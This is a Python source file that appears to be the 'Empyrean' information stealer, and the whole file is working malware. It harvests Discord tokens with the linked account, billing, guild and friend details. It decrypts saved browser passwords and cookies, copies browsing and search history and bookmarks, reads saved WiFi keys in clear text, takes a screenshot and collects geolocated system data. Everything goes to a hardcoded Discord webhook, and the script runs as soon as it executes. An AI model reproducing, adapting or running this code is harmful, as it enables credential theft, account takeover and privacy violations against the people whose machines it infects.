import requests
import re 
import json
import os
import time
import base64
import ctypes
import shutil
import subprocess
import psutil
import wmi
import uuid
from PIL import ImageGrab
from zipfile import ZipFile
from pathlib import Path
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook, File
from win32crypt import CryptUnprotectData
webhook: str = "https://discord.com/api/webhooks/1093010112823709817/8R7m2I17JOnBv_jUMr1zgwVyox64qqrtGpeyuq5aL3R1mgx2V7BOHLRcVN68ntwBo3Dz"

def disctoken(webhook: str) -> None:
    upload_tokens(webhook).upload()

class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens, self.uids = [], []

        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }


        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                            
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})

        if r.status_code == 200:
            return True

        return False
    
    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

class upload_tokens:
    def __init__(self, webhook: str):
        self.tokens = extract_tokens().tokens
        self.webhook = SyncWebhook.from_url(webhook)

    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:968704541946167357>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:968704542021652560>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "<:hypersquad_events:968704541774192693>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:968704541677723648>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:968704541501571133>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:968704541883261018>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:968704541874860082>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:968704542126510090>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "<:bug_hunter_2:968704541774217246>",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:968704541702905886>",
                "shift": 17,
                "ind": 131072
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:988996447938674699>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "⌨",
                "shift": 20,
                "ind": 1048704
            },
        }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

    
    def upload(self):
        if not self.tokens:
            return

        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            badges = ' '.join([flag[0] for flag in self.calc_flags(user['public_flags'])])
            
            if 'premium_type' in user:
                nitro = 'Nitro Classic' if user['premium_type'] == 1 else 'Nitro Boost'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []

                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('💳')
                    
                    elif method['type'] == 2:
                        payment_methods.append("<:paypal:973417655627288666>")

                    else:
                        payment_methods.append('❓')

                payment_methods = ', '.join(payment_methods)

            else:
                payment_methods = None

            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = True if guild['permissions'] == '4398046511103' else False
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = "✅" if guild['owner'] else "❌"

                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0:
                            invite = f"https://discord.gg/{invites[0]['code']}"
                        else:
                            invite = "https://youtu.be/dQw4w9WgXcQ"

                        hq_guilds.append(f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})")

                if len(hq_guilds) > 0:
                    hq_guilds = '\n'.join(hq_guilds)
                
                else:
                    hq_guilds = None

            else:
                hq_guilds = None

            if friends:
                hq_friends = []
                for friend in friends:
                    unprefered_flags = [64, 128, 256, 1048704]
                    inds = [flag[1] for flag in self.calc_flags(
                        friend['user']['public_flags'])[::-1]]
                    for flag in unprefered_flags:
                        inds.remove(flag) if flag in inds else None
                    if inds != []:
                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                            friend['user']['public_flags'])[::-1]])
                        hq_friends.append(f'{hq_badges} - `{friend["user"]["username"]}#{friend["user"]["discriminator"]} ({friend["user"]["id"]})`')  

                if len(hq_friends) > 0:
                    hq_friends = '\n'.join(hq_friends)

                else:
                    hq_friends = None

            else:
                hq_friends = None
            
            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']

                    codes.append(f":gift: `{name}`\n:ticket: `{code}`")

                if len(codes) > 0:
                    codes = '\n\n'.join(codes)
                
                else:
                    codes = None
            
            else:
                codes = None

            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
            embed.set_thumbnail(url=avatar)

            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
            embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
            embed.add_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)
            
            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            if hq_guilds != None:
                embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)
           
            if hq_friends != None:
                embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if codes != None:
                embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.set_footer(text="github.com/addi00000/empyrean")

            self.webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")


class chromium():
    def __init__(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)

        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        # self.working_dir = os.getcwd() + '\\empyrean-vault' 
        self.working_dir = os.getenv('TEMP') + '\\empyrean-vault'
        os.mkdir(self.working_dir)

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.cur_working_dir = self.working_dir + '\\' + name
            os.mkdir(self.cur_working_dir)

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.files = [
                '\\passwords.txt',
                '\\cookies.txt',
                '\\web-history.txt',
                '\\search-history.txt',
                '\\bookmarks.txt',
            ]

            for file in self.files:
                with open(self.cur_working_dir + file, 'w'):
                    pass

                self.funcs = [
                    self.passwords,
                    self.cookies,
                    self.web_history,
                    self.search_history,
                    self.bookmarks,
                ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile, self.cur_working_dir)
                    except:
                        pass

        with ZipFile(self.working_dir + '.zip', 'w') as zip:
            for root, dirs, files in os.walk(self.working_dir):
                for file in files:
                    zip.write(os.path.join(root, file), os.path.relpath(
                        os.path.join(root, file), self.working_dir))

        embed = Embed(title='Vaults', description='```' +
                      '\n'.join(self.tree(Path(self.working_dir))) + '```', color=0x000000)
        webhook.send(embed=embed, file=File(self.working_dir + '.zip'),
                     username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")

        shutil.rmtree(self.working_dir)
        os.remove(self.working_dir + '.zip')

    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str, working_dir: str) -> None:
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        vault = working_dir + name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open(working_dir + '\\passwords.txt', 'a') as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url != "" and username != "" and password != "":
                    f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(
                        username, password, url))

        cursor.close()
        conn.close()
        os.remove(vault)

    def cookies(self, name: str, path: str, profile: str, working_dir: str) -> None:
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        vault = working_dir + name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open(working_dir + '\\cookies.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key != "" and name != "" and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
        cursor.close()
        conn.close()
        os.remove(vault)

    def web_history(self, name: str, path: str, profile: str, working_dir: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        vault = working_dir + name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open(working_dir + '\\web-history.txt', 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url != "" and title != "" and visit_count != "" and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))

            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(
                    site[2], site[1]))

        cursor.close()
        conn.close()
        os.remove(vault)

    def search_history(self, name: str, path: str, profile: str, working_dir: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        vault = working_dir + name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open(working_dir + '\\search-history.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
                term = res[0]
                if term != "":
                    f.write("Search: {}\n".format(term))

        cursor.close()
        conn.close()
        os.remove(vault)

    def bookmarks(self, name: str, path: str, profile: str, working_dir: str) -> None:
        path += '\\' + profile + '\\Bookmarks'
        if not os.path.isfile(path):
            return
        shutil.copy2(path, 'bookmarks.json')
        with open('bookmarks.json', 'r', encoding="utf-8") as f:
            for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
                if 'children' in item:
                    for child in item['children']:
                        if 'url' in child:
                            with open(working_dir + '\\bookmarks.txt', 'a', encoding="utf-8") as f:
                                f.write("URL: {}\n".format(child['url']))
                elif 'url' in item:
                    with open(working_dir + '\\bookmarks.txt', 'a', encoding="utf-8") as f:
                        f.write("URL: {}\n".format(item['url']))

        os.remove('bookmarks.json')

class sysinfo():
    def __init__(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)
        embed = Embed(title="System Information", color=0x000000)

        embed.add_field(
            name=self.user_data()[0],
            value=self.user_data()[1],
            inline=self.user_data()[2]
        )
        embed.add_field(
            name=self.system_data()[0],
            value=self.system_data()[1],
            inline=self.system_data()[2]
        )
        embed.add_field(
            name=self.disk_data()[0],
            value=self.disk_data()[1],
            inline=self.disk_data()[2]
        )
        embed.add_field(
            name=self.network_data()[0],
            value=self.network_data()[1],
            inline=self.network_data()[2]
        )
        embed.add_field(
            name=self.wifi_data()[0],
            value=self.wifi_data()[1],
            inline=self.wifi_data()[2]
        )

        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save("screenshot.png")
        embed.set_image(url="attachment://screenshot.png")

        try:
            webhook.send(
                embed=embed,
                file=File('.\\screenshot.png', filename='screenshot.png'),
                username="Empyrean",
                avatar_url="https://i.imgur.com/HjzfjfR.png"
            )
        except:
            pass

        if os.path.exists("screenshot.png"):
            os.remove("screenshot.png")

    def user_data(self) -> tuple[str, str, bool]:
        def display_name() -> str:
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3

            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)

            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)

            return nameBuffer.value

        display_name = display_name()
        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv('USERNAME')

        return (
            ":bust_in_silhouette: User",
            f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
            False
        )

    def system_data(self) -> tuple[str, str, bool]:
        def get_hwid() -> str:
            hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

            return hwid

        cpu = wmi.WMI().Win32_Processor()[0].Name
        gpu = wmi.WMI().Win32_VideoController()[0].Name
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                    0].TotalVisibleMemorySize) / 1048576, 0)
        hwid = get_hwid()

        return (
            "<:CPU:1004131852208066701> System",
            f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
            False
        )

    def disk_data(self) -> tuple[str, str, bool]:
        disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
        for part in psutil.disk_partitions(all=False):
            if os.name == 'nt':
                if 'cdrom' in part.opts or part.fstype == '':
                    continue
            usage = psutil.disk_usage(part.mountpoint)
            disk += ("{:<9} "*4).format(part.device, str(
                usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"

        return (
            ":floppy_disk: Disk",
            f"```{disk}```",
            False
        )

    def network_data(self) -> tuple[str, str, bool]:
        def geolocation(ip: str) -> str:
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
            data = response.json()

            return (data["country"], data["regionName"], data["city"], data["zip"], data["as"])

        def proxy_check(ip: str) -> bool:
            url = f"https://vpnapi.io/api/{ip}"
            response = requests.get(url, headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
            data = response.json()
            security = data["security"]

            [proxy, vpn, tor] = [security["proxy"],
                                 security["vpn"], security["tor"]]

            if proxy or vpn or tor:
                return True

            return False

        ip = requests.get("https://api.ipify.org").text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        country, region, city, zip_, as_ = geolocation(ip)
        proxy = proxy_check(ip)

        return (
            ":satellite: Network",
            # f"```IP: {ip}\nMAC: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}\nVPN/Proxy/Tor: {proxy}```",
            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}\nVPN/Proxy/Tor: {proxy}```".format(
                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_, proxy=proxy),
            False
        )

    def wifi_data(self) -> tuple[str, str, bool]:
        networks, out = [], ''
        try:
            wifi = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
            wifi = [i.split(":")[1][1:-1]
                    for i in wifi if "All User Profile" in i]

            for name in wifi:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1]
                               for b in results if "Key Content" in b]
                except subprocess.CalledProcessError:
                    networks.append((name, ''))
                    continue

                try:
                    networks.append((name, results[0]))
                except IndexError:
                    networks.append((name, ''))

        except subprocess.CalledProcessError:
            pass

        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
        out += f'{"-"*20}|{"-"*29}\n'
        for name, password in networks:
            out += '{:<20}| {:<}\n'.format(name, password)

        return (
            ":signal_strength: WiFi",
            f"```{out}```",
            False
        )

        

    
disctoken(webhook)
chromium(webhook)
sysinfo(webhook)